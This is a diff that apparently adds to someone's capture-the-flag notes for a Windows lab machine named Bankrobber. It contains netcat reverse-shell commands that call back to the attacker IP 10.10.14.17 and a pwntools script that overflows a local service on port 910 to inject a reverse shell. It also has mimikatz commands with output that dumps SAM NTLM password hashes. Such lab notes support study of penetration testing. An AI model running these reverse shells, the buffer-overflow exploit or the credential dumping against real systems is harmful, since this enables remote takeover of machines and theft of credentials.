@@ -539,3 +539,60 @@ msf-pattern_offset -l 100 -q 0Ab1
 [*] Exact match at offset 32
 
 
+
+start in background
+C:\Users\Cortin>start /B \\10.10.14.17\share\nc.exe 10.10.14.17 4444 -e cmd.exe
+
+
+
+Copy-Item "//10.10.14.17/share/nc.exe" -Destination "nc.exe"
+
+```py
+from pwn import *
+
+r = remote("localhost", 910)
+r.recvuntil("[$] ")
+r.sendline("0021")
+sleep(1)
+r.sendline("A"*32 + "C:\\Users\\Public\\nc.exe 10.10.14.17 1337 -e cmd.exe")
+while True:
+    try:
+        print(r.recvline())
+    except EOFError:
+        break
+r.close()
+```
+
+transfer mimikatz
+
+lsadump::sam filename1.hiv filename2.hiv
+privilege::debug
+token::elevate
+https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a
+
+
+mimikatz # lsadump::sam filename1.hiv filename2.hiv
+Domain : BANKROBBER
+SysKey : 202fdd107485196bc066406e723ce9b3
+Local SID : S-1-5-21-2969120486-4178414442-4202251737
+
+SAMKey : fe0838eb6cce397bc7719abd878417a2
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Gast
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000003e8 (1000)
+User : Cortin
+  Hash NTLM: b6ef7dbfbb4a2baf86ac31399fb8b105
+
+RID  : 000003e9 (1001)
+User : admin
+  Hash NTLM: e3410ba7d850f81155a926b582978c7d
+
+
